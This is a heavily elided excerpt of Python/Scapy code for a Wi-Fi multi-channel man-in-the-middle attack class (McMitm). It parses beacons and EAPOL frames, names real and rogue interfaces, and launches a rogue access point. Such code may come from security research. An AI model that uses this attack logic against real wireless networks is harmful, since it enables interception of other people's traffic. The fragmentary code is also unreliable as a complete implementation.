...
def is_last_packet(p):
	if p.type == FRAME_TYPE_DATA:
		if EAPOL in p and p[EAPOL].type == 3:
	...
	def parse_beacon(self, p):
		...
		while isinstance(el, Dot11Elt):
			if el.ID == IEEE_TLV_TYPE_SSID:
				...
				self.real_channel = orb(p[Dot11EltDSSSet].channel)
...
class McMitm():
	def __init__(self, nic_real, nic_rogue, ssid, clientmac=None, dumpfile=None,
		...
		self.nic_real_ap = nic_real[:13] + "1b"
		self.nic_rogue_mon = nic_rogue
		self.nic_rogue_ap = nic_rogue[:13] + "a0"

		self.dumpfile = dumpfile
		self.ssid = ssid
		self.beacon = None
		self.old_beacon = None
			...
			if p.addr2 in self.clients:
				...
				if Dot11Auth in p or Dot11AssoReq in p or client.state <= ClientState.Connecting:
					...
					if TEST_OPTIMIZED_ATTACK and is_last_packet(p):
						...
						start_ap(self.nic_rogue_ap, 11, self.old_beacon)
